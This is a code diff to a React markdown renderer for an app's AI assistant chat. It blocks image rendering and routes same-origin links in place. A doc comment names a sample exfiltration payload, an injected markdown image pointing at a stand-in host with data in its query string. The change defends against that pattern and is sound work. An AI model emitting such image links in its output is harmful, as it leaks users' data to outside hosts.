@@ -1,6 +1,11 @@
-import { memo } from "react";
+import { memo, type ReactNode } from "react";
 import ReactMarkdown, { type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
+import { useNavigate } from "react-router";
+import { ArrowRight } from "lucide-react";
+import { useUtilityNavigation } from "../../hooks/ui/use-utility-navigation";
+import { getShellMode } from "../../hooks/ui/use-shell-mode";
+import { useAssistantStore } from "../../stores/assistant-store";
 
 /**
  * Discord-flavoured markdown renderer for chat bubbles.
@@ -11,8 +16,53 @@ import remarkGfm from "remark-gfm";
  * a themed, horizontally-scrollable monospace surface.
  *
  * Raw HTML is NOT enabled (no rehype-raw), so react-markdown's default
- * sanitization keeps user/assistant text safe.
+ * sanitization keeps user/assistant text safe. Images never render: an injected
+ * `![](https://x/?d=…)` would leak data the moment it loads.
+ *
+ * In-app links (`/today`, `?settings=assistant`) navigate in place; everything
+ * else opens as an external link.
  */
+
+/** Same-origin path. `//host` and `/\host` are protocol-relative and leave the app. */
+export function isInAppPath(href: string): boolean {
+    return href.startsWith("/") && !href.startsWith("//") && !href.startsWith("/\\");
+}
+
+const LINK_CLASS =
+    "font-medium text-accent-primary underline decoration-accent-primary/40 underline-offset-2 transition-colors hover:decoration-accent-primary";
+
+function AssistantLink({ href = "", children }: { href?: string; children?: ReactNode }) {
+    const navigate = useNavigate();
+    const { openSettings } = useUtilityNavigation();
+    const setAssistantPanelOpen = useAssistantStore((s) => s.setAssistantPanelOpen);
+    const settingsTab = href.startsWith("?settings=") ? new URLSearchParams(href).get("settings") : null;
+
+    if (!settingsTab && !isInAppPath(href)) {
+        return (
+            <a href={href} target="_blank" rel="noreferrer noopener" className={LINK_CLASS}>
+                {children}
+            </a>
+        );
+    }
+
+    return (
+        <a
+            href={href}
+            className={`${LINK_CLASS} inline-flex items-baseline gap-0.5`}
+            onClick={(e) => {
+                e.preventDefault();
+                // Phone/tablet: the assistant sheet covers the page, so step out of the way.
+                const shell = getShellMode(window.innerWidth);
+                if (shell === "phone" || shell === "tablet") setAssistantPanelOpen(false);
+                if (settingsTab) openSettings(settingsTab);
+                else navigate(href);
+            }}
+        >
+            {children}
+            <ArrowRight size={11} className="self-center opacity-70" aria-hidden />
+        </a>
+    );
+}
 
 const components: Components = {
     // Paragraphs — tight leading inside a bubble, no margin on the last one.
@@ -25,16 +75,7 @@ const components: Components = {
     em: ({ children }) => <em className="italic">{children}</em>,
     del: ({ children }) => <del className="opacity-80 line-through">{children}</del>,
 
-    a: ({ href, children }) => (
-        <a
-            href={href}
-            target="_blank"
-            rel="noreferrer noopener"
-            className="font-medium text-accent-primary underline decoration-accent-primary/40 underline-offset-2 transition-colors hover:decoration-accent-primary"
-        >
-            {children}
-        </a>
-    ),
+    a: ({ href, children }) => <AssistantLink href={href}>{children}</AssistantLink>,
 
     // Inline vs block code. `inline` is provided by react-markdown's code renderer.
     code: ({ className, children, ...props }) => {
@@ -94,7 +135,7 @@ const components: Components = {
 function MarkdownImpl({ children }: { children: string }) {
     return (
         <div className="break-words [&>*:first-child]:mt-0 [&>*:last-child]:mb-0">
-            <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
+            <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} disallowedElements={["img"]}>
                 {children}
             </ReactMarkdown>
         </div>
